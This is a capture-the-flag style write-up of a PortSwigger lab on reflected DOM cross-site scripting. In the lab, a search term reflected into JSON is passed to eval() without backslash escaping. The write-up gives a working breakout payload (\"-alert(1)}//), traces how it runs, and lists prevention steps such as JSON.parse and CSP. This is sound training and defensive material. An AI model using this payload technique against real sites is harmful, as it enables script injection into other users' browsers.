# 🔐 Cross-Site Scripting (XSS) Vulnerability Report

## 📌 Target
Platform: portswigger
Room: Reflected DOM XSS via JSON Injection into eval()

## 🎯 Objective
- Exploit unsafe JavaScript processing to:
  - Break out of JSON string context
  - Abuse eval() execution
  - Trigger arbitrary JavaScript

---

## ❗ Why This Matters

- eval() executes attacker-controlled code
- Improper escaping can:
  - Break JSON structure
  - Inject executable payloads
- High severity due to:
  - Full client-side execution
  - Filter bypass potential

---

## 🧪 Exercises Performed

## 🔍 Part 1 — Identify Vulnerable Flow

### 1️⃣ Search for Test Input

```text 
XSS
````

---

### 2️⃣ Inspect Intercepted Response

- 📌 Response:

```json
{"searchTerm":"XSS","results":[]}
```

---

### 3️⃣ Analyze JavaScript

- 📌 `searchResults.js` uses:

  ```javascript 
  eval(...)
  ```

---

## ⚠️ Vulnerability Insight

```text 
JSON response injected into eval() with weak escaping
```

---

## 🚀 Part 2 — Escape JSON Context

### 4️⃣ Discover Weakness

* Quotes escaped
* Backslashes NOT escaped

---

### 5️⃣ Payload

```javascript
\"-alert(1)}//
```

---

## 🚀 Part 3 — Exploit Parsing

### 6️⃣ Resulting JSON

```json 
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

---

### 7️⃣ Execution Flow

* `\\` cancels escape
* `"` closes string
* `-alert(1)` executes
* `}//` comments remainder

---

### 8️⃣ Result

```javascript 
alert(1)
```

- ✔️ Confirms reflected DOM XSS

---

## 🏁 Lab Completion

* JSON breakout successful
* JavaScript executed

- ✔️ Lab solved 🎉

---

## 🧠 Key Takeaways

* eval() is highly dangerous
* Escaping one character set is insufficient
* Backslash handling can break sanitization
* JSON injection can become code execution

---

## 🔥 Core Vulnerability

```text 
User-controlled JSON injected into eval() with improper escaping
```

---

## 🛡️ Prevention

* Avoid:

  * eval()
* Use:

  * JSON.parse()
* Properly escape:

  * Quotes
  * Backslashes
  * Control characters
* Enforce CSP

---

## ⚠️ Safe Alternative

```javascript 
JSON.parse(response);
```

---

## 🏁 Status

- ✔️ Lab Completed
